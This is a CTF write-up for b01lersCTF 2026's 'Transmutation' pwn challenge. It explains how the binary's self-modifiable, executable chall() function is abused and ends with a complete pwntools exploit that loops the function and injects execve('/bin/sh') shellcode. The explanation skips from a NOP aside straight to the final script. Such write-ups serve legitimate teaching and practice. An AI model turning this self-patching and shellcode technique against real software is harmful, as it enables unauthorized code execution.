## b01lersCTF 2026 Writeup

<div style="display:flex;align-items:center;width:100%">
<div style="flex:1;text-align:left">
<a href="https://pointerpointer.com/">WoawoWOaw</a>
</div>
<div style="flex:1;text-align:center">
<a href="index.html">Home</a>
</div>
<div style="flex:1;text-align:right">
<a href="THEM500CTF.html">500 Member miniCTF</a></div>
</div>

## Challenge Directory

[Transmutation](#challenge-name-transmutation)


### Challenge Name: `Transmutation`


The Purdue Boilermakers' very own CTF ehhh? Let's see what you got for us b01lers!!

The description for this pwn challenge was quite peculiar, yet it's a great hint for the challenge and its eventual solution, and here it is!

> To turn one program into another... is it even possible?

> Author: [`spacemonkeyy`](https://vaultcord.com/tools/discord-id-lookup?prefill=775859387259420723)


If you would rather like an image (worth a 1000 words!) of the challenge...

![Image](b01lersCTF2026/transmutationChalDesc.png)


In `dist.zip`, the source code + binary + dockerfile + libc + fake flag file were all provided.

![Image](b01lersCTF2026/handout.png)


Oh I also ran `file` on the binary and here's what we got

```bash
./chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
 dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
 BuildID[sha1]=ccb2df99403cd7f4ba744d0f617a035c522eda02, for GNU/
 Linux 3.2.0, not stripped
```

As we have the source code, we don't care that it's not stripped, but the fact that it's dynamically linked is interesting, as it means that we can potentially do some dynamic linking shenanigans to pwn the binary, which is always fun!!

Since we already have the libc binaries, the dockerfile wasn't that useful in this specific instance, but here it is if you were curious:

```Dockerfile
FROM --platform=linux/amd64 debian@sha256:f807f4b16002c623115b0247dca6a55711c6b1ae821dc64fb8a2339e4ce2115d AS build

RUN apt-get update && \
apt-get install -y gcc

ENV USER priority-queue
WORKDIR /home/$USER
RUN useradd $USER

COPY ./chall.c .
RUN gcc -no-pie -o chall chall.c

RUN mkdir /out
RUN cp chall /out/chall

FROM --platform=linux/amd64 debian@sha256:f807f4b16002c623115b0247dca6a55711c6b1ae821dc64fb8a2339e4ce2115d AS inner

RUN apt-get update && \
apt-get install -y socat

COPY --from=build /out/chall /app/run
RUN chmod +x /app/run

COPY ./flag.txt /app/flag.txt

FROM pwn.red/jail

COPY --from=inner / /srv

ENV JAIL_MEM=10M
ENV JAIL_TIME=120
ENV JAIL_PORT=1337
```

I guess we can already see that we have no PIE (Position Independent Executable) on the binary, but we do have ASLR on the libc, which means that we will need to leak a libc address in order to calculate the base address of libc in memory if we want to exploit it using the libc binaries.

Here's the rest of the checksec output:

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

The only protection we really have to care about is NX (Non-Executable Stack), which means that we can't just inject shellcode onto the stack and execute it, but we can still do Return Oriented Programming (ROP) to achieve code execution, which is what I ended up doing in my exploit in a roundabout way.


Ok, now onto the juicy c code and the little quirks we can exploit!

```c
//chall.c

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#define MAIN ((char *)main)
#define CHALL ((char *)chall)
#define LEN (MAIN - CHALL)

int main(void);

void chall(void) {
    char c = getchar();
    unsigned char i = getchar();
    if (i < LEN) {
        CHALL[i] = c;
    }
}

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    mprotect((char *)((long)CHALL & ~0xfff), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);

    chall();
    return 0;
}
```

Hmmmm interesting, the permissions of the memory page containing the `chall()` function are set to be executable, which means that we can write to it and then execute it, effectively allowing us to hopefully inject shellcode into the `chall()` and bypass NX!!

In case you were curious about the `mprotect()` function, it is a system call that changes the access protections for a memory region. In this case, it is being used to set the memory page containing the `chall()` function to be readable, writable, and executable. 
<small>You can read more about `mprotect()` in the Linux manual pages: https://man7.org/linux/man-pages/man2/mprotect.2.html</small>


The address being passed to `mprotect()` is calculated by taking the address of `chall()`, aligning it down to the nearest page boundary (using bitwise AND with `~0xfff` {'`~`' is the bitwise NOT operator}), and then specifying a size of `0x1000` bytes (which is the size of one memory page). The protection flags `PROT_READ | PROT_WRITE | PROT_EXEC` indicate that the memory region should be readable, writable, and executable.

The `chall()` function itself is also quite interesting, as it allows us to write a single byte to an arbitrary index in the `chall()` function, and my first idea was to try to write shellcode byte by byte into the `chall()` function. 

This was thwarted by the fact that the `chall()` function is only ever invoked once and it also has a limit on how far it can write, the index of which must be less that `MAIN - CHALL`, which is the length of the `chall()` function in bytes. (as the main function directly follows the `chall()` function in memory, which is a consequence of the binary being compiled without PIE)

We can also just double check the addresses either in gdb or a disassembler (I used Binary Ninja) to confirm that the `chall()` function is indeed located before the `main()` function in memory, which is a requirement for this exploit to work.

![Image](b01lersCTF2026/challMainPlaces.png)


To solve this challenge, I used the pwntools python library <small> which you can read all about here: https://docs.pwntools.com/en/stable/about.html </small> 

To make it easier for myself, I made a helper function to send a byte value and an index to write to, which is basically what the `chall()` function allows us to do.

```python
def write_byte(byte_val, index):
    p.send(byte_val)
    p.send(bytes([index]))
```

Now if there was only a way to call the `chall()` function over and over again, allowing us to arbitrarily write as many bytes as we want.

There's a reason I selected the "disassembly" view in Binja. This view also has the corresponding opcodes next to each assembly instruction, which would help us figure out which bytes to overwrite to get what we want!

What's been really useful for this process in terms of understanding the assembly and the opcodes is the "X86 Opcode and Instruction Reference" at http://ref.x86asm.net/coder64.html

![Image](b01lersCTF2026/opcodeRef.png)

For instance, here's the entry for a really famous opcode, the NOP instruction (`0x90` in x86 assembly which stands for "No Operation"), which does nothing and is often used in "NOP sleds" to help with shellcode execution.





Here's my full exploit for this challenge in case ya wanna see it all in one place:

```python
#!/usr/bin/env python3

from pwn import *

context.binary = binary = './chall_patched'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF("./libc.so.6")
elf = ELF(binary)

# p = process(binary)
p = remote('transmutation.opus4-7.b01le.rs', 8443, ssl=True)

script = '''
b *(chall+24)
'''

def write_byte(byte_val, index):
    p.send(byte_val)
    p.send(bytes([index]))

if args.GDB:
	gdb.attach(p, gdbscript=script)
	
# p.send(b'\x90')
# p.send(chr(72))
write_byte(b'\x90', 72)

# p.send(b'\x90') 
# p.send(chr(49))
write_byte(b'\x90', 49)

# p.send(b'\x90') 
# p.send(chr(48))
write_byte(b'\x90', 48)


shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
start_offset = 186

for i, byte in enumerate(shellcode):
    write_byte(bytes([byte]), start_offset + i)


write_byte(b'\x70', 73)
write_byte(b'\xeb', 72)

p.interactive()
```

Finally, the elusive flag has been revealed!!

### Flag: ```bctf{CPU_0pt1m1z3r5_H4T3_th15_0n3_51mp13_tr1ck_5519225335}```


<div style="display:flex;align-items:center;width:100%">
<div style="flex:1;text-align:left">
<a href="THEM500CTF.html">500 Member miniCTF</a>
</div>
<div style="flex:1;text-align:center">
<a href="index.html">Home</a> /
<a href="Seccon142025.html#">Top</a>
</div>
<div style="flex:1;text-align:right">
<a href="OSUGaming2025.html">OSU Gaming 2025</a></div>
</div>